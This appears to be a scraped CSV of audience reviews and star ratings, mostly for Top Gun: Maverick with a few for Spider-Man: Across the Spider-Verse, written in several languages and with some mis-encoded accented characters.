it apart from no way home. it's just bad.",2.5
It's a fantastic movie! Although it had an unbeatable predecessor it shows that if you want to do a good job you can keep the quality up. Completely amazing from start to end... And keeps you at the edge of your seat inpatient to see the sequel,5
"Omg. This is a must watch. Was very trippy as well, which was another plus. ü´∂üèΩüíï",5
"Creative, bridging comic books and animation.",4
"Mid, really mid, don't watch",0.5
Awesome animation. Cliffhanger is an absolute killer,4
"Great movie, I enjoyed the cliffhanger ending. Can‚Äôt wait to see what happens Beyond.",5
loved the action and the style of the movie.,5
[SPOILER] Big takeaway is they don't mention Gwen Stacy's death in TASM 2 it was a bigger impact to Peter than George Stacy,3.5
"It's been years since I've seen a movie where the audience stood up at the end and gave a movie a standing ovation, but it happened when we saw this masterpiece. The animation is like something you have never seen before, in the last film the characters from other dimensions were done in their own art style from the comics but this time we see whole worlds and move around and live in them a bit, it was stunning. Like the first the humor is top-notch, the cast is phenomenal and the direction is going to put this film in the Oscars for sure. Lord & Miller really delivered a powerful story for the kids and their parents, Miles (Shameik Moore) is still my favorite Spider-Man and I loved seeing so much more of Gwen Stacey (Hailee Steinfeld) she's amazing in her own right. If you haven't seen these watch Spider-Man: Into the Spider-verse now then go see Spider-Man: Across the Spider-verse in theaters, it's amazing on the big screen. This is Fellowship of the Rings big in it's quality and scope, don't miss it!",5
It's really entertaining to see how they show different characters the cliffhanger is perfect,5
"The best Spider-Man movie by far, the fact some people want to hate on it because it's an animation movie just baffles me",5
Amazing movie! Love that I can see if with my kids and everyone love it!,5
It was entertaining and the snimation was fantastic.,5
"After nearly forty years since the original Tom Cruise's Maverick is back this time to train a group of graduates for a special assignment, it may not sound that exciting but believe me the flight scenes are simply amazing.",4
"Es incre√≠ble, el mejor de todos!",5
"""It improves on the old way in every way: the story is smarter and more gripping, the dialogue sharper and funnier. The aerial acrobatics are likely to make you feel dizzy""",3.5
I just love this secule,5
"TOP Gun es un Clasico para lodos los amantes de la series de amor, el ver la historia de Maverick rebelde con todas las caracteristicas de un super piloto, pero que le falta madurar... Se volvio un clasico para cuantas veces la pueda ver..Tom CRUISE es taquillero, pero este film lo llevo a la fama y estrellato...",4.5
"Buen√≠sima, un gran cl√°sico",5
"Es un cl√°sico qu√© uno no se cansa de ver, adem√°s que Tom siempre hace buenas pel√≠culas",4.5
Uff peliculon de acci√≥n y aviones,5
Tom Cruice es sin√≥nimo de calidad.,4
Excelente pel√≠cula de acci√≥n me encanto a mi ya mi familia,4
Recomendaci√≥n buena peli,5
Es una pel√≠cula de acci√≥n y aventura de vida .,3.5
Muy buena pel√≠cula de acci√≥n,4
Love it! Cuanta nostalgia! me llev√≥ a los 80's,5
"Simplemente muy recomendable tomar Cruise es sin√≥nimo de taquilla excelente pel√≠cula, toda la saga muy buena üëå",5
"Si la primera fue incre√≠ble, esta segunda es un s√∫per hit!!! simplemente √©pica Tom Cruise es una bala!!",5
"Muy buena, se las recomiendo.",5
One of the only times I can easily say that a sequel is better than the original. This movie makes planes exciting for everyone.,5
Una excelente pel√≠cula para pasar el rato,5
Didn‚Äôt think it would be possible to make a good sequel to the first. I was wrong. Just enough tie in to the original and yet still it‚Äôs own movie. A level of predictability is present. If this is a major issue you should probably choose another genre.,5
"Disney and hollywood needs to take some notes. Reviving/continuing old movies means you need to reference and nod to the classics before it, which TG:Mav did and continued to extend the story. The story was smart not to mix politics (didn't mention where the enemies are from). That's why the film did extremely well and got paid billions. Pay the fan's service, and they'll pay you in box office sales. Simple math.",5
One of the best movies ever made. Definitely a masterpiece!,5
"La historia es grandiosa incluso logra superar su predesesora la misi√≥n al final se ve muy bien.Tiene un exelente sonido, efectos visuales y el conflicto entre Rooster y Maverick es muy entretenida.La amo.üòÅ",5
what can I say? what an awesome movie,5
"Awesome, simply awesome!!!",5
Absolutely amazing. Watch it,5
Tom Cruise is a STAR!!!!!,5
Just the right balance of nostalgia and new. A fun movie all around. The lack of CGI-overload was a welcome change of pace.,5
"Se ve interesante, si me gustar√≠a verla, espero tener la oportunidad.",5
"Usually, sequels that are done many years (or in this case, nearly four decades) later have a very slim chance of recapturing the magic of the original. This one, however, manages to do just that. Similar in tone to the original, yet has the updated technology to fit the modern time. It has plenty of callbacks to the original, but never feels overdone or corny. It's a worthy continuation and is worth your time to watch.",4
One of the most feel good action movies that makes you go back to theaters,5
"After more than two decades, I thought making a Top Gun 2 would be a dangerous move, but the movie proved me wrong with a great plot and performance of Tom Cruise.",5
"Filme com a√ßa do come√ßo ao fim! Muito bem dirigido, roteirizado e gravado (fotografia maravilhosa). Recomendo!!!! NOTA FINAL: 9!",5
Not really a sequel as much as a redo. Maverick is one of the most entertaining movies ever made.,5
"Breaking new ground with its audacity, breathtaking visuals, and technical prowess, it's a refreshing reinvention for a star known for relentless dedication, and a redemption of sorts for Tom Cruise.",5
That movie was crazy good!!!,5
I thought Top Gun Maverick was great! Way better than the first one.,4
Ultra fun and feels like an old school 80/90s movie.,5
"Um dos melhores filmes de a√ß√£o de todos os tempos! Como um f√£ do cl√°ssico, digo que essa sequ√™ncia supera o original em todos os aspectos, e o Tom Cruise √© sensacional, como sempre‚Ä¶ O restante do elenco tamb√©m manda ver, sem falar nas cenas de a√ß√£o muito bem feitas!",5
"Completely overrated. Felt like military propaganda. Not entertaining at all, better to just go watch an air-show. Considering the hoopla surrounding it I expected much better. Shame.",1.5
It's Tom Cruise and fighter jets. What more can you want? It had a thrilling story and the visuals were brilliant. Everyone behind this movie put their heart and soul into it. Instant classic.,5
Genialna produkcja. Tak powinno siƒô robiƒá akcyjniaki!,5
"fantastic flight visuals, never forget that intense scenes. cruise's all time best. masterpiece!",5
So much fun- this is the way you make a sequel! The flying sequences were insane.,5
It was a proper sequel to the OG and a fun ride.,4.5
"Gave the same feeling I've had when I was a child and I used to watch movies, like old style movies with not plenty of CGI effects, relaxing. But totally not Action or Adventure as listed, more a Family genre . Not super impressed to press 5* and I don't know why so many 5* and Fresh reviews. üôÉ",3
"This movie was a great follow up to the original. Time Cruise stayed true to his Maverick character. I love how it had a very believable storyline from the original movie and paid homage to the original characters. The overall movie showed growth as everyone in the original has aged, as well as how the military has changed since the original movie very well done!",5
This movie was amazing! Instantly hooked from the start. I was grinning the entire movie. Normally I don't trust sequels that release years after the original but they definitely put the work in on this one.,4.5
"At last, a movie that stands on its own merits, without catering to those looking for validation of whatever inferiority complex they need soothed. Whether it's penis envy, sexual deviance parading itself as progressive, or an easy going nihilism that is debilitating, and infectious. A truly entertaining movie.",5
"felt good to see a movie I used to watch with my dad. made me miss him. he would have loved how well they did this, they did the original justice",4.5
Way better than the first that is for sure,5
Overall great movie!,4.5
I'm a pig but I wish I was a fighter pilot. Hell ya America!,5
Fun. Moving. Exciting. Far superior to the original.,5
"Only Tom Cruise could have pulled this off. In very familiar territory, with a so-and-so plot Cruise makes the most of it.",5
"Entertaining and incredible action sequences, but even more incredible is the story and depth that was lacking in the original movie.",4.5
Just pure oldschool entertainment with no caveats,5
"I really don't have an attachment to the original Top Gun. I do love several Tom Cruise films though. I was quite impressed with this movie. It had everything to make this a fantastic summer movie. It had humor, action, drama, and a little romance. I'd say it's now a favorite Tom Cruise movie of mine. Definitely recommend. Since I have seen the old one a little bit, I got that nostalgic feeling.",5
You have to watch this it. It's so good,5
"una gran pel√≠cula, los efectos pr√°cticos son incre√≠bles, la trama es atrapante, aunque se siente un poco contradictoria con la pel√≠cula anterior con cosas como que all√° echado a maverick tan r√°pido de su objetivo original que era ser instructor y las actuaciones son decentes pero aveces flaquean, sin embargo el resto es perfecto, espero que hallan mas secuelas como esta",4.5
I like the movie but it is a bit overrated,3.5
"Absolutely brilliant movie wish there were more made like this these days, no woke rubbish just fun to watch, best movie made in years",5
"Fun! Works as nostalgia, yet can still stand on it's own. Dare I say it, an improvement over the first.",3.5
"IT'S A PPIECE OF ART, EMOTIONAL, EXITING, FRESH... AUTENTIC... PUFFFF INCREDIBLE!!!",5
I regret for not watching on the big screen. It's an excellent movie!,5
"I can't believe that Maverick exists in this new role, i ready for the end of the saga",3.5
"Cruise at it's best,It is rollercoaster ride of cruise and Kosinski awsome work.The team have pulled off something unique.Just watch in night...",5
"Shocking suspense, jokes, action, etc! It has everything!!!",5
A bit (okay a lot) cliche but that's what we expected. I fixed a nice dinner for my husband and surprised him with this on the screen while we dined on our TV trays. We both loved the thrills and flying and realism of it all.,3.5
"I was surprised when I watched this movie on IMAX.Because when we took off from the runway, it caught our hearts with the music and the loud sound of the movie",5
Espetacular o tempo todo!,5
"It was a decent sequel without being a complete remake. It held attention as the flying was super engaging and adequately tense in all the right places. In the end, it was disappointing that the whole thing was so one-dimensional. It didn't leave the audience with anything to think about. Studios KNOW how writing works, and how to translate that to screen. You 90-120 minutes of my time? Well, I'm going to want something for that since so many other films have it to give. Meh.",3
"Brings us back in time, when movies were pure entertainment.",5
Didn't watch the 1st part but this one is good that's for sure,3.5
"This film gives the first movie justice. It didn't disappoint, but exceeded expectations.",5
"Absolutely loved it! This movie, in some way, represents all of my joyful memories. Tom cruise once again leaves me in awe!",4
Maverick is the best movie since last year,5
"This was a good movie. To be honest I did not think I would like it. But they did a great job, keeping up with the original. That is hard to do.",4
region liberty records llc is writing people to sign to their label and they are offering millions is this a scam?,5
"Brilliant sequel, lot of the top gun stuff in this one which doesn't do it any harm. Loved it, brought back memories from the 80's.",4.5
"This movie is beyond amazing, the score and the soundtrack are perfect, all the flying stunts are so cool, and there's truly nothing else like it",5
"Never been so happy to be proven wrong. I didn't think they could possibly make a sequel to even make sense after the original never mind be as entertaining as this was. Big Fan of the original, and big fan of the sequel.",5
This movie is SO Awesome!!!!,5

O filme surpreendeu demais. Foi a melhor continua√ß√£o sem que alguem tivesse pedido. Maverick foi o melhor filme de a√ß√£o para assistir no cinema em todo o ano de 2022,5
The perfect sequel. Top Gun: Maverick gives us a fresh experience of the film genre we all love. It is a pure action movie.,5
is there anything to say? its great! i saw it at home on altibox. i loved it,5
"The original with Tom Cruise was already a real hit back then, the sequel many many years later manages something that actually only happens extremely rarely in the film business: it's even better. Everything fits here and besides action, humor, etc., there is a lot of nostalgia that is simply fun to watch.",5
Very impressed. I was worried considering how bad most remakes are.,5
I want to watch this movie every day for the rest of my life ü•π BRAVO!,5
Doesn't get any more fun than this. I saw the first one in theaters in 1986. So cool,5
"I asked my parents what they thought of it & it was a üëéüëéüëéüëéüëé Thumbs Down from both of'em. My dad siting it as more of a love story than an Action film. Siskel & Ebert said in the 80's that critics were bought off being more concerned with getting paid rather than telling it like it was; this movie is a spitting image of that. In today's world it's over the top in your face. I was not bored with the movie but I found many things to be completely predictable. 1. Ejection at Mach 10, impossible. 2. No consequences for the destruction of a multi million dollar air craft. 3. Sabotaging the son of his former co-pilot from getting into Annapolis Navel Academy (Dam Right Low & Childish) 4. Former lovers reunion. 5.. Over the Top Super Heros Again that can't be killed & Save The Day making you lose care for the character because you know how it will be. 6. The idea of using Fighter Jets from the 1970's is kinda Like trying to use a Hugh's World War 2 Fighter plan in a 80's movie. Just don't buy into that idea. 7. Totally ripped off the ending scene from Star Wars A New Hope (GREAT SHOT KID! THAT WAS ONE IN A MILLION!) 8. To Google & every other network platform! Please stop making fake robot programs to write lollipop reviews with glowing 5 ‚≠ê! I noticed this from the top review by the reviewer writing the same opening lines on many reviews. It's disrespectful to real reviewers & all humans. Grow a pair of Balls & give the Cancel Culter a rest! No One Is Gonna Learn Anything From These ""LOLLIPOPS!"" No real human is like that. This Generation Is To Easy To Please.",1.5
It's a thrilling action movie. I super love it as they seldom or never used CGI.,5
What a blast. AWESOME flick with top notch cinematography.,5
"I really enjoyed this movie. It nods to the original first Top Gun movie, but it doesn't try to copy it. This is about giving the audience what it wants. I went to see a movie about fighter pilots who are the best of the best and I got it. They even threw in some beach sports, love it. The commitment Tom Cruise has to his movies is legendary. I encourage everyone to check out the behind the scenes stuff out there about this movie. It is amazing what they actors went through in order to make this movie as amazing as it is.",5
that's how u make movies....,5
"A breath of fresh air with a movie that delivers story, action and drama... without ""ThE MeSsAgE"". Keep it up.",5
"This is one of the all-time great movies. If you haven‚Äôt seen it, you need to see it in the theater. It is amazing.",5
This movie is simply fantastic.,5
"Great movie. Heartbreaking and heartwarming both at the same time. Adrenalin rush, and comical. It will have you cheering and on the edge of your seat. Loved it",5
Top gun maverick is one of the best films of all time you must watch this world class awesome film on the big screen this is on of the best world class films of all time please please watch this film on the big screen,5
ONE OF THE BEST FILMS I'VE SEEN! Tom cruise never disappoint. The adrenaline rush!!! I just know that I'll watch this film agaaaaaaaain and agaaaaaaaaain.,5
The best movie of 2022! Its So Good!!!,5
"I enjoyed every bit of the movie, except for the cringy women being boss and all scenes. And even loved the critics who were seething about ""muh representation"".",5
"Amazing movie, a must watch for anyone. The ratings are true for anyone who hasn't seen it yet.",5
I thought all the action scenes were amazing but there are two things holding this movie back. The first one is the super unneeded romance that felt super unnecessary. And the second thing is the constant fake deaths which happen about 3 times and it felt kinda repetitive. But besides that this is a pretty solid movie.,3.5
Not sure I can say anything other than this movie was outright great! Ready for another! Only one thing I wish lasted longer was our lovely dancing sceneü§£ü§£,5
"Amazing film, best seen in cinema but have watched it a few times since. Great film, cast and music",5
"I guess I'm the only one who thinks this movie is way overrated, lol. The last twenty minutes was spectacular and one of the best footage of its type in cinematic history! So how sad the the first, what, hour and a half was very slow and uninteresting, sorry; so was hard for me to give the entire film a good rating.",2.5
It was just a copy of the first movie. Unimaginative.,0.5
What a load of popcorn poo poo. Who could believe half the crap he pulls off? How impossible. It is a silly teen movie with all the predictable outcomes and usual bad guys.,1
"I've only just round to watching it. My only regret Is that I didn't watch it in the cinema. Absolutely blown away by this movie, and it takes an awful lot to get 5 stars from me. Not since the original matrix have I saw a film as 5 star. What I love about this film is the great action, fantastic REALISTIC action and amazing soundtrack. A really good story line too. I can't see anybody being disappointed by this movie",5
Very close to the perfect summer popcorn movie... that a thrill ride with a nice amount of nostalgia for those who remember the original.,5
After hating the first one on re-watch and wanting to walk out in the first few minutes of this. It pulled up from what I thought was an inevitable crash and soared past my expectations of entertainment,4.5
"I created an account just to write a review for this movie. This was an incredible movie!! I went in to the movie not expecteding much and was blown away. This far exceeded what I expected from a movie. It was a mix of everything, excitement, heartfelt moments, genuine concern for each character, no real plot holes, unexpected surprises. This is now in my top 10 list, I've watched it 4 times now at different times with different people and I am entertained each time. 10/10!",5
"Top Gun: Maverick is 100% a sequel that is completely better than the first film in every possible way. This film actually has a real story, and isn't just military propaganda like the first one is. Although this is also a movie I don't think is as good as people say it is. But it is a good decent movie that has heart, emotion, and a pretty compelling story. If only one Top Gun movie needs to be talked about, it's definitely this one, because the first one is nothing but a bland form of media that just features information about the Air Force. Top Gun Maverick is actually good.",3.5
"Beat movie ever! Gives great homage to the first one. Saw this 4 times in the theater, and have watched countless times at home. Tom puts on an amazing performance. Even the ""newcomers"" who were nothing before this film are complete standouts!",5
I just watched it for the fourth time. Still get emotional. Fantastic movie.,5
Me encantooo!! Tenia mucho que no me emocionaba con una pel√≠cula; y con ganas de volver a verla üòÖ,5
"Somehow, Maverick has more classic value than its predecessor. It's solid, old fashioned, and well designed in every way.",4
Falar o que? Apenas assistam!!,5
"A great film that respects the original. I only watched the first film recently, which was also a great film.",5
Straight through a great movie. Tom is fantastic. Just enough throw backs. Awesome fly scenes. Very rare that a sequal is this good. I love it.,5
"Good movie. Entertaining. The action and visuals were cool. I'd watch it again. Lots of unnecessary filler content to connect the plot. Story wise, it's lacking. Basically Luke blowing up the death star but it's Tom Cruise. Very reminiscent of the original movie. The music was epic. Not a must-watch but I would recommend it.",3.5
"One of the few sequels to an 80s movie that keeps a good link with the original atmosphere. It's of course a very USA movie, cowboys and all; but this is part of the good features. Thumbs up.",4
The best movie of 2022 and one of Tom Cruise's best!,5
One of my favorite movies I've seen and also one of my favorite theater experiences!,5
Great American movie!,5
"A sequel that gets rid of all the bad, and improves on the good.",4.5
"A movie how it‚Äôs supposed to be. No BS, good old fashion American flick!! Bravo",5
"The stupidity of the American movie-going public is on full display with this awful sequel of an equally awful original. Where's the plot, the characterization, the emotion? Nowhere! That 90+% of the American public likes this movie makes me want to move to China! What was good about it? What?",1.5
"Fun, immersive, crowd pleasing action despite its predictability.",4
"to be quite honest i hated the first top gun movie, but i absolutely loved this one. first off the cgi was good, the storyline was great, and overall its definitely my top movie of 2022",5
"This movie make no sense. There's no plot. Just some action scenes. It makes absolutely no sense, it's nonsense, it's just an ego-dream by this Scientology guy Tom Cruise. No humor, no nothing.",1
The best damn movie he's ever been apart of I hope he makes another one way better the m-I,5
Top Gun 1 rehash with the plot of Star Wars,1
Great movie... Start to finish... USA usa USA,5
"Best moie out there, if you loved Top Gun, you will definitely love Top Gun: Maverick.",5
Greatest movie I've ever watched.,5
Great movie!!i wasn't able to watch first movie at the theatre instead I watched as a kid on tv or vhs tape which I watched over and over.this new installment brought back a lot of memories.I've watched the new one several times after going to the theatre.it safe to say it will be watched for along time on streaming services.,5
This movie is AWESOME. I can't wait to watch it again... enjoyed it more than the original. Just watch it.,5
Outstanding movie! Kept me on my toes the entire time!,5
"Another spectacular movie with Cruise, who seems to turn everything into gold. Great movie overall. Intense action, suspense and effects. Hard to tell what‚Äôs CG and what‚Äôs live action. Only criticism is a result of unrealistic dialogue bordering cringy at times. But a great movie that demands being seen on the big screen.",4
"The formula they used felt very 2000s, but it was honestly refreshing to watch since we've been plagued by terrible movies recently.",5
"Filma√ßo, valeu muito a experi√™ncia em assistir no Cinema, uma das melhores da vida. Assistiria novamente com muito prazer.",5
This has to be the best film I have seen in 2023 yet. The opening of a Mach 10.2 jet could not have been better written. Realistic scenarios and a constant force to decide in a dilemma situation. A proper sequel to the previous film.,5
Top Gun: Maverick continues to excite and entertain every time I see it! Even though its been more than a year since its release and I've seen it around 6 times!! It is absolutely fantastic! From the writing to the actor's performances and sound track.. can't go wrong! It's a 100% good 'ol fashion action movie with a pro American feel/theme. I love being able to watch a movie that isn't a remake and isn't packed full of any kind of social or political malarkey. üòÅüá∫üá∏ You can just watch and enjoy! If you have yet to see it I highly recommend!!!,5
"Come on, Americans. Grow up. What a pathetic one-sided look on how preventing wars in the world works. And all the other countries¬¥ soldiers are morons. It¬¥s not the 80s anymore. I exspect much better in the times of Nolan. 2 stars for some impressive flying scenes though.",2
Kept same vibe with that genuine corny feel you want from an action movie. Loved the way they captured the pilot's experience in the cockpit!,5
A pale copy of the original one... I am not convinced this new version 30y later was necessary. Quite disappointing.,2.5
"If im being honest, Dont make fun of me, I hated this. It was so boring. For a movie with the word Gun, It is super boring",1.5
Perfect action-flick movie,5
Probably one of my favorite movies now of all time. Plot line was original and the suspense is something I haven't felt in a movie in a long time! I can't stop watching this movie!,5
This was such a fantastic movie. The visuals were on point. You could never dream of better dogfighting scenes.,5
"Nice film , realistic and sadly the last movie before T.C starts to look older üòï. Great action nice story heart warming etc . A great nod to Val Kilmer.",4.5
It delivers the first once vibe and it also delivers so much more. Great movie all and all. Highway through the danger zone.,5
Good thing is see top gun 2 and learn to ‚Äújust do it‚Äù will help sometimes then wasting time by thinking but sometimes they both help.,5
"Although an enjoyable film, there was a tad too much emphasis on Tom Cruise as an ace and not enough of him teaching the young aces. That was the script-writers' choice. I watched the original Top Gun when I was young, so did enjoy seeing a version that showed the matured characters. The aerial photography is superb! As a whole, I give the film 8/10",4
I cannot begin to say how well scripted and how well acted this movie is. Everyone brought out their uniqueness of their characters. This is a truly spectacular film and the best sequel to a movie ever. Tom Cruise worked so hard making this movie and it truly paid off. The movie have you on the edge of the seat almost the entire time. The flying sequences are so beautifully captured. I truly believe the critics score should rated higher and the same as the audience score. Thank you Tom Cruise for making such an amazing movie and capturing hearts of your audiences.,5
"Give it a go, fun movie, and one that we need in this time of bad films",4.5
The film is action pact and has great acting. The story is not the best but still one of the best movies of 2022.,4
As a top gun fan. It's a must see. And it's the best possible sequel ever ! Love it,5
2cnd greatest sequel behind The Godfather. F word awesome!!!! I cried a bit‚Ä¶,4.5
"This was an atrocious movie. The only palatable parts of the movie were regurgitated samples of the first movie; They crapped out the first movie and put it between stale, moldy white bread then claimed it a gourmet sandwich. SPOILERS following. The moldy bread was basically Maverick wrecking a multimillion dollar experimental plane only to be told he can't retire so he can teach reckless flying to the next gen pilots. The middle was just a repeat of the first movie - the songs, the topless hunks and the dogfights were just repeats of the first movie. They proceeded to have them do an essentially impossible run which turns out to be a dumb remake of the Deathstar run only missing a reference to womp rats. Followed by an even more ridiculous ""redemption"" arc with the nephew. All in all it was a remake of the first with unintelligible hoopla added on. Would not recommend, would not watch again - just watch the first. It does everything the second one does but better and none of the stupid crap added in.",0.5
"Not exactly a complex story but a very enjoyable one, it was a treat seeing special effects that weren't CGI for once. I hope there as a sequel as long as it can come close to the same quality.",5
"To start, I am not much of a Tom Cruise fan any longer, but with that said, I will add that I have great memories of the original Top Gun movie. This movie was a wonderful sequel to the Maverick legacy. Everything about the movie was right of point, with just the right amount of nostalgia thrown in. Well-written, well-acted, on-the-edge-of-your-seat flight maneuvers -- and of course Maverick saves the day. Lovely in every way.",5
"One of the best movie ever. Family friendly, impressive views, real stunts. Nice diversity and realistic. Top classy acting, real funny stuff in it too. Family non political. If was was hard left wing film Hollywood would of pumped more advertising into it.",5
Great reminder of what going to the theater used to feel like. So much fun without any agenda or messaging in any direction. Just strap in and hang on. Exactly what I‚Äôm looking for,5
"Masterpiece. Best sequel ever. Exciting, nostalgic and funny at the same time. One of my favourite movies. 10/10",5
"Awesome, one of the best movies I've seen.",5
Incredible film. Immersed in an action the whole film. A spectacle for the eyes and a symphony for the heart. Great film 10/10,5
"The plane stuff looks cool. Otherwise, this isn't so much a movie as an ode to Tom Cruise's ego. Honestly seems more like a parody of Top Gun than a sequel to it.",1
Two snaps up in a circle. I waited a long time for this release. Thanks,4
"This is the right way to do a sequel. Excellent storyline, action sequences, and characters. Thoroughly fun and just might be better than the original. Well done in both paying homage to the original while also bringing the movie into todays technological world.",5
What more do you want in an action movie? It's all here.,5
Outstanding sequel and paid great tribute to the original. Casting was terrific and the action was what we've come to expect from a Cruise movie.,5
This is one of only a few great sequels. it pays homage to the original without being derivative or tiresome. The visuals are great and the practical effects/minimalist CGI are a welcome deviation from the marvel-esque sky-beams and fake explosions. The movie knows what it is and it doesn't try to be anything else.,5
"I've watched Movies I mean a lot, but this is absolutely one of the best I've ever watched. Every Role played Accordingly. Directed and produced with distinction. With those little sparks of tears in my eyes right through till the end, significantly tells me How Good the movie is. Absolutely perfect.",5
"Simply perfect, engaging, nostalgic, amazing and emotional.",5
The best movie of my life. Cruise is the best ever.,5
Tom Cruise just can't miss! True living legend. Must watch movie at all costs! I'd pay double the price of admission if they'd let me.,5
"Everything you want in a movie . absolutely stellar work from everyone involved, only minor thing you could find a flaw in is that there's striking similarities in the mission to star wars but im not complaining about that lol",5
Best Tom cruise movie idk why this was so good it just was,4.5
Top Gun 2 was amazing movie not to bad the music I loved by Lady Gaga Hold my hand his my number one music of all time one of my favorite,4.5
"Absolute must see if you liked the first. A homage to the first film, with some new twists. All the actors do great job and i found myself on the verge of tears. A real roller coaster ride. 5 stars.",5
"This is a great sequel to the first, I love bob",4
"Wow. Just, wow. It gets better every time you watch it.",5
"Thought it would be just another lame sequel, but it was really, really good.",4.5
the greatest movie of all time,5
"This movie is incredible. The way they filmed the actors in real jets pays off in a big way on screen as it gives the movie a level of authenticity and immersion that many modern movies lack. The story is very simple but executed to near perfection. I honestly don't think you have to watch the original to enjoy this movie but I would recommend it to feel the full emotional impact of some character arcs. If you do watch the original for the first time in preparation for this movie and don't like it, have no worries. This sequel runs laps around the original.",5
"To be clear. I didn't hate it. I just don't see the brilliance everyone else sees. They just took the script from the first one and revised it for today's PC overly sensitive audience. Hit all the same beats as the first one. The opening flying sequence, straight to the bar sequence, straight to surprising his students like Kelly did in the first movie. Instead of a volleyball scene, it's a football scene. Erase the hype, and it leaves a solid sequel for an 80s hit that was doing fine as a stand alone. Brilliant...no. A good movie... sure. But I can see the brilliance when you take into consideration it's lack of competition.",3
"In a time when big budget blockbusters seem to have the same old recipe, Top Gun Maverick delivers emotion alongside some much needed old fashioned thrills that adds a whole new flavor.",5
"A highly original follow-up surpassing its predecessor in almost every way, using nostalgia simply to augment the already compelling characters and emotional plot. Starting light hearted and, through a well paced sequence of scenes, building in suspense, the film demands your full attention until the last frame. Hans Zimmer's interpretation of the original score along with his hints to Kenny Loggins ‚ÄòDanger Zone' is a musical treat to those listening carefully. With all these moving pieces ""flying"" together in perfect formation, Top Gun Maverick is‚Ä¶ one of the best sequels ever made",4.5
This movie is great. When they drop the first trailer of the movie I immediately buyest to this one. It's a bit hard to wait for almost 3 years and 2 years in home. and this movie is absolutely worth the wait for the big screen experience. So I watched it 5 times in its first opening weekend. This is the type of movies that didn't made in this times. It's not just one of my absolute favorite movie of last year but all time.,5
Super fun to see in the theater.,5
Best movie of 2022. Pure adrenaline & emotion. Brings the '80s to today - or today back to '80s,4.5
This movie is really an excellent movie with good storyline and jaw dropping plane fight scenes which gives us a amazing theatre experience.this movie was all beyond my expectations!. normally movie sequels fail to reach the level of of its original but this one really outperform led it's original one in all aspects.tom cruise once more proved to be the best actor by his extraordinary acting skills.this movie also had a beautiful plot with nice character development and dialogues which even give us goosebumps.without doubt it's one of my favourite movies,5
"Awesome action flick. Traditional action movies at their finest. Some character work as well, but we all know that's not what you're here for.",4.5
"A superior sequel, with first-rate action sequences and a strong, character-driven story! Grade: A",5
"Wow! I really like Top Gun: Maverick....Again! I saw it on the big screen when it came out and I rented it again for family. So good. Even the second time. It is the sequel to the 1986 film Top Gun, and Tom Cruise is back again from the original. A bit more humble and more serious as a older Maverick. Now 30 years later, Captain Pete Mitchell -Maverick is still a top naval aviator, but now he is hand picked as the teacher to the new TOP GUN's elite graduates. Maverick is their leader, sending them on a almost impossible mission that they may not come back from. On this top-secret assignment, again Maverick stretches the rules to the breaking point. I like this film better than the first one. Lots of action, great story, and of course Tom Cruise is awesome. This is my pick for best picture of 2022.",5
super healthy (except for Val) super strong super athletic people you don't get to know train for a super unrealistic star wars scenario. A navy captain owns a super expensive historical plane (including hangar) and let's a comrade play around at the motor with a ratchet before flying away with his bartender girlfriend who came along in her luxury sailboat and porsche. Good flight scenes though,1.5
"√â incr√≠vel como esse filme ele √© independente, a dire√ß√£o e o roteiro conseguiu com √™xito d√° continuidade a uma hist√≥ria anterior e trazer novos conflitos e novas emo√ß√µes sem que isso interferisse no sentido do filme. Em alguns pontos top gun maverick consegue superar seu primeiro filme, acho que j√° √© a quinta vez que assisto a esse filme e cada uma das vezes continuo me impressionando e emocionando nas mesmas cenas.",5
i F L Y,5
Executed well to continue the story of a likeable character. All around fun feel good movie.,5
"It's a bit cheesy, but still a fun movie to watch with the family",3.5
The perfect sequel to the original 80's masterpiece!,5
"This movie was way better than it had any right to be. Although I liked Top Gun, it was never near my top list of movies. Maverick was one of my favorite movies of the year and I was completely blown away by it in theaters and watching it from home. Loved this movie.",5
It was all we wanted and more,5
Loved it. Such a nice follow up to the original!!,5
"Sensacional, isso sim √© um filme de verdade. Sem lacra√ß√£o e milit√¢ncia doentia. Levei a esposa e meus dois filhos e todos adoraram o filme.",5
"As Maverick pushes all limits in the (pleasantly) unexpected sequel to Top Gun, Tom Cruise breaks the sound barrier in what can only be described as pure cinema.",5
The dialogues are so bad and so many cliches. Yes the action sequences are almost flawless but the writing seems like an AI did it,3
Quite literally my favorite film of all time.,5
"Outstanding, exceptional, terrific!!!",5
"Best film I've ever seen, maverick riding his Motor bike with a smile on his face made it for me",5
"Filme top com um elenco muito bem escolhido enredo plaus√≠vel, √© um filme que d√° gosto de assitir do come√ßo ao fim mais de uma vez",5
Top gun maverick is how you do a sequel. This movie is a summer movie and will leave you wanting a 6 pack and to play football shirtless on a beach with others. This movie makes you have dreams of being a jet pilot when you never wanted to before. It makes you feel good inside and guaranteed to make you leaving the room with a smile on from a great time all around the film is.,4.5
"Beautiful movie that is sooo needed right now! The dog fight scenes suffered from too much CGI but everything else is pure Tom Cruise exhilaration, big-hearted fun that only he can provide. Val Kilmer's written role was so damn good! Movie reminds you to love the strength & freedom we still have in this country for the time being as many entertainment companies seem to want to tear it down w hate & division just for clicks & attention from the corrupt people in power.",5
"This movie had minimal wokeness, was believable, real and entertaining. What movies should be.",5
"One of the best movies I've ever seen. It's a bit cheesy, but it accomplishes what it's meant to do with flying colors, which is provide an epic and blockbuster-esque experience.",5
I don‚Äôt remember a movie that gave me goosebumps like this one. One word. Iconic.,5
"Somehow this was significantly better than the original, definitely a must see.",5
"I find Tom sexier in this part after 30 years lol. The fatherly love here is touching, the guilt, in general there was a lot of feelings, tension and drama - I liked it.",5
"I absolutely loved it! It was everything I wanted it to be and more. The action sequences were incredible, the acting was top-notch, and the story was both heartwarming and exciting. I especially loved the way the film handled Maverick's character arc. He's still the same maverick he was in the first film, but he's also grown and matured. He's learned to be a better leader and a better mentor, and he's finally come to terms with his past. I also really appreciated the film's homage to the original Top Gun. There were plenty of callbacks to the first film, but they were never forced or cheesy. They just felt natural and added to the overall sense of nostalgia. Overall, I thought Top Gun Maverick was a fantastic film. It's a must-see for fans of the original and anyone who loves a good action movie.",5
"Plot is silly nonsense for most part but just a plain fun time with good action and a real antidote for dross that passed for movies around it. TC certainly delivers bums on seats, pretty much and sadly the last of the movie stars.",3.5
"I didn‚Äôt see the original, this movie was still pretty good. I think it‚Äôs been a tad overrated but it‚Äôs an entertaining action movie with a few memorable moments.",3.5
"Much better than the first Top Gun movie. It's like they learned from all the flaws of the first one and fixed it for this one. Overall, it's fun, intense, and emotional.",4
